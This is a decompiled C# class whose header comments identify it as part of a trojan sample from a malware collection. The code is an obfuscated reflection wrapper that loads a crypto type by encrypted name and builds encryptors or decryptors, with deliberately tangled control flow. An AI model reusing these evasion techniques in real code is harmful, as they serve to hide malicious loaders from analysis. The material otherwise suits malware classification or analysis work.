// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ccy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc6f4431894d1c97
// MVID: 2A74CDCD-1E5F-40DD-90C8-12E38E6596C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Jorik.Llac.cfi-7d3f633a775aae62503ba637b47672afca334a930966f3c35ac40563155370b2.exe

using \u0002;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0002
{
  internal sealed class \u0003 : IDisposable
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private readonly Type \u0001;
    private readonly object \u0001;

    static \u0003() => \u0001.\u0002.\u0002(typeof (\u0003));

    public \u0003()
    {
      this.\u0001 = Assembly.Load(\u0003.\u0001(411)).GetType(\u0003.\u0001(546));
      this.\u0001 = Activator.CreateInstance(this.\u0001);
    }

    public ICryptoTransform \u0002([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
    {
      MethodInfo setMethod1 = this.\u0001.GetProperty(\u0003.\u0001(485)).GetSetMethod();
      object obj3 = this.\u0001;
      object[] objArray1 = new object[1];
      object[] objArray2;
      if (true)
        objArray2 = objArray1;
      objArray2[0] = (object) obj0;
      object[] parameters1 = objArray2;
      setMethod1.Invoke(obj3, parameters1);
      MethodInfo setMethod2 = this.\u0001.GetProperty(\u0003.\u0001(490)).GetSetMethod();
      object obj4 = this.\u0001;
      object[] objArray3 = new object[1];
      if (true)
        goto label_4;
label_1:
      objArray2[0] = (object) obj1;
      object[] parameters2 = objArray2;
      setMethod2.Invoke(obj4, parameters2);
      MethodInfo method = this.\u0001.GetMethod(obj2 ? \u0003.\u0001(516) : \u0003.\u0001(495), new Type[0]);
      if (true)
        goto label_5;
label_2:
      MethodInfo methodInfo;
      return (ICryptoTransform) methodInfo.Invoke(this.\u0001, new object[0]);
label_5:
      methodInfo = method;
      goto label_2;
label_4:
      objArray2 = objArray3;
      goto label_1;
    }

    public void \u0002()
    {
      do
      {
        int num;
        if (true)
          num = 0;
        else
          goto label_5;
label_2:
        if (num == 0)
        {
          if (num == 0)
            this.\u0001.GetMethod(\u0003.\u0001(537)).Invoke(this.\u0001, new object[0]);
        }
        else
          goto label_6;
label_5:
        num = 0;
label_6:
        if (true)
        {
          if (num == 0)
          {
            if (false)
              goto label_5;
          }
        }
        else
          goto label_2;
      }
      while (false);
    }

    public void Dispose() => this.\u0002();
  }
}
